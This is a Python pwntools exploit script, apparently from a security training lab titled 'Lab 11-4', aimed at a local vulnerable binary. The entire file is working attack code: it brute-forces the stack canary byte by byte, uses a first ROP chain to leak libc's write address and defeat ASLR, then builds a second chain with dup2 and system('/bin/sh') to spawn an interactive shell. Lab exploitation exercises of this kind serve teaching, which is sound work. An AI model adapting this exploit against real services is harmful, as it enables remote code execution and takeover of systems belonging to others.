from pwn import *

# Lab 11-4: ASLR bypass with an Information Leak
# gcc -no-pie -fstack-protector vuln.c -o vuln
# echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

context(os='linux', arch='amd64')

def exploit(payload, interactive=False, leak=False):
    r = remote("127.0.0.1", 4446, level='error')
    r.sendafter("Password: ", payload)

    try:
        if leak:
            return u64(r.recv(8))

        if r.recvrepeat(0.1)[:7] == b"Invalid":
            return True

    except EOFError:
        return False

    finally:
        if interactive:
            r.interactive()
        else:
            r.close()

def leak_bytes(payload, name):

    leaked_bytes = []
    progress = log.progress(name, level=logging.WARN)

    for _ in range(8):
        for i in range(256):
            if exploit(payload + p8(i)):
                payload += p8(i)
                leaked_bytes.insert(0, hex(i))
                progress.status(repr(leaked_bytes))
                break

    progress.success(repr(leaked_bytes))

    log.info(f"Leaked {name} = {hex(u64(payload[-8:]))}")
    return payload[-8:]

elf  = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

payload  = b"A"*72
payload += leak_bytes(payload, "Canary")
payload += p64(0xBADC0FEE0DDF00D) #SFP

s1_rop = ROP(elf)
s1_rop.write(4, elf.got.write)
log.info(f"Stage 1 ROP Chain:\n{s1_rop.dump()}")

leaked_write = exploit(payload + bytes(s1_rop), leak=True)

libc.address = leaked_write - libc.sym.write
log.info(f"libc_base == {hex(libc.address)}")

s2_rop = ROP(libc)
s2_rop.dup2(4, 0)
s2_rop.dup2(4, 1)
s2_rop.dup2(4, 2)
s2_rop.system(next(libc.search(b"/bin/sh")))

log.info(f"Stage 2 ROP Chain:\n{s2_rop.dump()}")

exploit(payload + bytes(s2_rop), interactive=True)

